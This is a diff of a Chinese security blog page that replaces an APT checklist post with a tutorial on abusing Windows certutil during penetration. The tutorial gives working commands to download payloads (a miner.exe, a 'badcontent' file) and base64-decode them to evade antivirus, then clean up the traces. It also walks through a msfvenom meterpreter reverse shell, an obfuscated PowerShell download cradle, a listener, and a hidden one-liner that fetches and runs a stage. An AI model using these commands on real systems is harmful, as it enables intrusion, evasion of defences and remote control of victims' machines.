@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>清夜无尘の一方天地  | 韩国方向APT-Q-12漏洞利用复现分析</title>
+	<title>清夜无尘の一方天地  | Certutil在渗透中的使用</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.128.0">
 	
@@ -151,9 +151,9 @@ onload='renderMathInElement(document.body);'></script>
 		<a href="https://wander1ng.com/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
 	</h2>
 </div>
-<h1 class="pt-2">韩国方向APT-Q-12漏洞利用复现分析</h1>
+<h1 class="pt-2">Certutil在渗透中的使用</h1>
 
-<h3 class="text-java-700 font-normal leading-relaxed pt-2">还没修的0day保密</h3>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">虽然不是很厉害但至少开始写了</h3>
 
 <div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
 	
@@ -170,7 +170,7 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 </div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
-		datetime="2024-11-12T16:53:23&#43;08:00">2024-11-12</time>
+		datetime="2024-11-14T16:06:31&#43;08:00">2024-11-14</time>
 </div>
 
 <hr />
@@ -183,28 +183,147 @@ onload='renderMathInElement(document.body);'></script>
 
 <article>
 	<section class="mx-auto content">
-		<div class="c-rich-text"><ul>
-<li>
-<p><input checked="" disabled="" type="checkbox"> APT-Q-12普通探针</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> APT-Q-12针对Word的探针</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> APT-Q-12针对WPS的探针</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> APT-Q-12针对某邮箱平台的第一个0day</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> APT-Q-12针对某邮箱平台的第二个0day</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> APT-Q-14针对某Android 平台邮件客户端 0day 漏洞</p>
-</li>
-</ul>
-<p>参考：</p>
-<p><a href="https://ti.qianxin.com/blog/articles/operation-deviltiger-0day-vulnerability-techniques-and-tactics-used-by-apt-q-12-disclosed-cn/"><strong>Operation DevilTiger：APT-Q-12 使用 0day 漏洞技战术披露</strong></a></p>
+		<div class="c-rich-text"><p>CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。</p>
+<p>经典用法是处理Base64编码的数据：</p>
+<pre tabindex="0"><code>C:\Windows\Temp&gt; certutil.exe -decode input.txt output.exe
+//-decode参数用于将编码的文件解码为其原始的二进制形式
+//第一二个必选参数分别为输入文件名、输出文件名
+</code></pre><p>也能够从远程URL下载证书或者任何其它文件</p>
+<p>语法： “certutil.exe -urlcache -split -f [URL] output.file”</p>
+<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://37.44.212.223/miner.exe C:/Windows/temp/yete.exe
+</code></pre><p><code>-f</code> 覆盖现有文件。有值的命令行选项。后面跟要下载的文件 url。•<code>-split</code> 保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。•<code>-URLCache</code> 显示或删除URL缓存条目。无值的命令行选项。（certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）</p>
+<p><strong>两种功能进行结合：首先对恶意文件进行base64编码，以绕过AV检测， 然后在使用CertUtil.exe下载后再对其进行解码。</strong></p>
+<pre tabindex="0"><code>C:\Windows\Temp&gt;certutil.exe -urlcache -split -f &#34;https://hackers.home/badcontent.txt&#34; bad.txt
+C:\Windows\Temp&gt;certutil.exe -decode bad.txt bad.exe
+</code></pre><p>攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。</p>
+<p>使用Certutil.exe下载文件，下载完成以后一定记得delete 清理痕迹。</p>
+<pre tabindex="0"><code>C:\&gt; certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log
+C:\&gt; certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log delete
+</code></pre><p>还可以用来校验hash值，这个之前使用过</p>
+<pre tabindex="0"><code>certutil -hashfile mimikatz.exe MD5    //检验MD5certutil -hashfile mimikatz.exe SHA1 //检验SHA1certutil -hashfile mimikatz.exe SHA256 //检验SHA256
+</code></pre><p><strong>Certutil命令配合PS反弹后门</strong></p>
+<p>PowerShell 混淆框架：https://github.com/danielbohannon/Invoke-CradleCrafter</p>
+<p>1.在加载PowerShell脚本之前，先来进行数字签名，运行命令。</p>
+<pre tabindex="0"><code>PS C:\Invoke-CradleCrafter&gt; Set-ExecutionPolicy Bypass
+执行策略更改
+执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
+中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略? Y
+</code></pre><p>2.使用方法，执行两条命令，加载框架。</p>
+<pre tabindex="0"><code>PS C:\Invoke-CradleCrafter&gt; Import-Module .\Invoke-CradleCrafter.ps1
+PS C:\Invoke-CradleCrafter&gt; Invoke-CradleCrafter
+
+Invoke-CradleCrafter
+
+          _____                 _                    ,
+          \_   \_ ____   _____ | | _____           /(  __________
+           / /\/ &#39;_ \ \ / / _ \| |/ / _ \_____    |  &gt;:==========`
+        /\/ /_ | | | \ V / (_) |   &lt;  __/_____|    )(
+        \____/ |_| |_|\_/ \___/|_|\_\___|          &#34;&#34;
+           ___              _ _        ___           __ _
+          / __\ __ __ _  __| | | ___  / __\ __ __ _ / _| |_ ___ _ __
+         / / | &#39;__/ _` |/ _` | |/ _ \/ / | &#39;__/ _` | |_| __/ _ \ &#39;__|
+        / /__| | | (_| | (_| | |  __/ /__| | | (_| |  _| ||  __/ |
+        \____/_|  \__,_|\__,_|_|\___\____/_|  \__,_|_|  \__\___|_|
+
+        Tool    :: Invoke-CradleCrafter
+        Author  :: Daniel Bohannon (DBO)
+        Twitter :: @danielhbohannon
+        Blog    :: http://danielbohannon.com
+        Github  :: https://github.com/danielbohannon/Invoke-CradleCrafter
+        Version :: 1.1
+        License :: Apache License, Version 2.0
+        Notes   :: If(!$Caffeinated) {Exit}
+
+HELP MENU :: Available options shown below:
+</code></pre><p>3.MSF攻击主机，生成payload，并将生成好的payload放入网站根目录，保证能够正常访问。</p>
+<pre tabindex="0"><code>[root@localhost ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp \
+&gt; lhost=192.168.1.30 lport=8888 -e cmd/powershell_base64 \
+&gt; -f psh -o lyshark.txt
+
+[root@localhost ~]# cp -a lyshark.txt  /var/www/html/
+[root@localhost ~]# systemctl restart httpd
+</code></pre><p>4.powershell 框架设置指定好的URL链接。</p>
+<pre tabindex="0"><code>Invoke-CradleCrafter&gt;  set URL http://lyshark.com/lyshark.txt
+
+Successfully set Url:
+http://lyshark.com/lyshark.txt
+</code></pre><p>5.分别执行以下命令完成初始化，这里如果报错请添加环境变量。</p>
+<pre tabindex="0"><code>Invoke-CradleCrafter&gt; MEMORY
+
+Choose one of the below Memory options:
+
+[*] MEMORY\PSWEBSTRING          PS Net.WebClient + DownloadString method
+[*] MEMORY\PSWEBDATA            PS Net.WebClient + DownloadData method
+[*] MEMORY\PSWEBOPENREAD        PS Net.WebClient + OpenRead method
+[*] MEMORY\NETWEBSTRING         .NET [Net.WebClient] + DownloadString method (PS3.0+)
+[*] MEMORY\NETWEBDATA           .NET [Net.WebClient] + DownloadData method (PS3.0+)
+[*] MEMORY\NETWEBOPENREAD       .NET [Net.WebClient] + OpenRead method (PS3.0+)
+[*] MEMORY\PSWEBREQUEST         PS Invoke-WebRequest/IWR (PS3.0+)
+[*] MEMORY\PSRESTMETHOD         PS Invoke-RestMethod/IRM (PS3.0+)
+[*] MEMORY\NETWEBREQUEST        .NET [Net.HttpWebRequest] class
+[*] MEMORY\PSSENDKEYS           PS SendKeys class + Notepad (for the lulz)
+[*] MEMORY\PSCOMWORD            PS COM object + WinWord.exe
+[*] MEMORY\PSCOMEXCEL           PS COM object + Excel.exe
+[*] MEMORY\PSCOMIE              PS COM object + Iexplore.exe
+[*] MEMORY\PSCOMMSXML           PS COM object + MsXml2.ServerXmlHttp
+[*] MEMORY\PSINLINECSHARP       PS Add-Type + Inline CSharp
+[*] MEMORY\PSCOMPILEDCSHARP     .NET [Reflection.Assembly]::Load Pre-Compiled CSharp
+[*] MEMORY\CERTUTIL             Certutil.exe + -ping Argument
+</code></pre><pre tabindex="0"><code>Invoke-CradleCrafter\Memory&gt; CERTUTIL
+
+[*] Name          :: Certutil
+[*] Description   :: PowerShell leveraging certutil.exe to download payload as string
+[*] Compatibility :: PS 2.0+
+[*] Dependencies  :: Certutil.exe
+[*] Footprint     :: Entirely memory-based
+[*] Indicators    :: powershell.exe spawns certutil.exe certutil.exe 
+[*] Artifacts     :: C:\Windows\Prefetch\CERTUTIL.EXE-********.pf AppCompat Cache
+</code></pre><pre tabindex="0"><code>Invoke-CradleCrafter\Memory\Certutil&gt; ALL
+
+
+Choose one of the below Memory\Certutil\All options to APPLY to current cradle:
+
+[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
+
+
+Invoke-CradleCrafter\Memory\Certutil\All&gt; 1
+
+Executed:
+  CLI:  Memory\Certutil\All\1
+  FULL: Out-Cradle -Url &#39;http://lyshark.com/lyshark.txt&#39; -Cradle 17 -TokenArray @(&#39;All&#39;,1)
+
+Result:
+SV 1O6 &#39;http://lyshark.com/lyshark.txt&#39;;.(Get-Command *ke-*pr*) ((C:\Windows\System32\certutil /ping (Get-Item Variable:\1O6).Value|&amp;(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike&#39;*and&#39;}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike&#39;*Com*e&#39;}).Name).Invoke(&#39;*el*-O*&#39;,$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2|&amp;(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike&#39;*and&#39;}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike&#39;*Com*e&#39;}).Name).Invoke(&#39;*el*-O*&#39;,$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-SkipLa 1)-Join&#34;`r`n&#34;)
+
+Choose one of the below Memory\Certutil\All options to APPLY to current cradle:
+
+[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
+</code></pre><p>6.将上方混淆后的内容保存为 crt.txt 然后进行encode加密</p>
+<pre tabindex="0"><code>C:\Users\lyshark\Desktop&gt;certutil -encode crt.txt crt.cer
+
+输入长度 = 912
+输出长度 = 1310
+CertUtil: -encode 命令成功完成。
+</code></pre><p>7.将生成的 crt.cer放入服务器的根目录下，保证能够访问，然后运行msfconsole控制台，并侦听事件。</p>
+<pre tabindex="0"><code>[root@localhost ~]# cp -a crt.cer /var/www/html/
+
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost 192.168.1.30
+lhost =&gt; 192.168.1.7
+msf5 exploit(multi/handler) &gt; set lport 8888
+lport =&gt; 8888
+msf5 exploit(multi/handler) &gt; exploit -j -z
+</code></pre><p>8.最终靶机执行，以下命令。</p>
+<pre tabindex="0"><code>powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\crt.cer (New‐Object Net.WebClient).DownloadString(&#39;http://lyshark.com/crt.cer&#39;); certutil ‐decode %APPDATA%\crt.cer %APPDATA%\stage.ps1 &amp; start /b c
+md /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\crt.cer
+</code></pre><p>这种情况下powershell脚本不会落地</p>
+<p>没想到一个校验证书的程序能有这么多的功能&hellip;</p>
+<p><em>参考：</em></p>
+<p><a href="https://cloud.tencent.com/developer/article/1850744">干货 | Certutil在渗透中的利用和详解</a></p>
+<p><a href="(https://www.cnblogs.com/LyShark/p/10994300.html)">certutil 命令配合PS反弹后门</a></p>
+<p><a href="https://wsygoogol.github.io/2018/12/17/%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8CertUtil-exe%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/">攻击者利用CertUtil.exe植入恶意软件</a></p>
 </div>
 	</section>
 
@@ -373,7 +492,7 @@ onload='renderMathInElement(document.body);'></script>
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		Copyright © 2019–2024
 		<br />
-		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 152 words in this page.
+		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 1777 words in this page.
 	</div>
 </div>
 
@@ -384,17 +503,17 @@ onload='renderMathInElement(document.body);'></script>
 <hr class="double-line" />
 <div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
     
-    <a class="flex-grow-0" href="/post/msi%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8F%8A%E7%9B%B8%E5%85%B3apt%E7%BB%84%E7%BB%87%E6%89%8B%E6%B3%95/">
+    <a class="flex-grow-0" href="/post/%E9%9F%A9%E5%9B%BD%E6%96%B9%E5%90%91apt-q-12%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
             <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
-        Msi恶意文件及相关APT组织手法
+        韩国方向APT-Q-12漏洞利用复现分析
     </a>
     
     
-    <a class="flex-grow-0" href="/post/certutil%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/">
-        Certutil在渗透中的使用
+    <a class="flex-grow-0" href="/post/%E5%A4%8D%E4%B9%A0https%E6%8F%A1%E6%89%8B%E6%B5%81%E7%A8%8B/">
+        复习HTTPS握手流程及相关扫描器
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
@@ -408,6 +527,8 @@ onload='renderMathInElement(document.body);'></script>
 <div class="font-serif pb-2 flex align-start leading-loose">
 	<span class="heading pr-6 leading-loose">Related</span>
 	<span >
+		
+			<a href="/post/%E9%9F%A9%E5%9B%BD%E6%96%B9%E5%90%91apt-q-12%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">韩国方向APT-Q-12漏洞利用复现分析</a>&nbsp;&nbsp;&#47;&nbsp;
 		
 			<a href="/post/msi%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8F%8A%E7%9B%B8%E5%85%B3apt%E7%BB%84%E7%BB%87%E6%89%8B%E6%B3%95/">Msi恶意文件及相关APT组织手法</a>&nbsp;&nbsp;&#47;&nbsp;
 		
@@ -435,9 +556,7 @@ onload='renderMathInElement(document.body);'></script>
 		
 			<a href="/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/">Python中的短路评估</a>&nbsp;&nbsp;&#47;&nbsp;
 		
-			<a href="/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/">常见JavaScript混淆与反混淆</a>&nbsp;&nbsp;&#47;&nbsp;
-		
-			<a href="/post/hugo&#43;cloudflare%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97/">Hugo&#43;CloudFlare搭建博客指南</a>
+			<a href="/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/">常见JavaScript混淆与反混淆</a>
 		
 </span>
 </div>
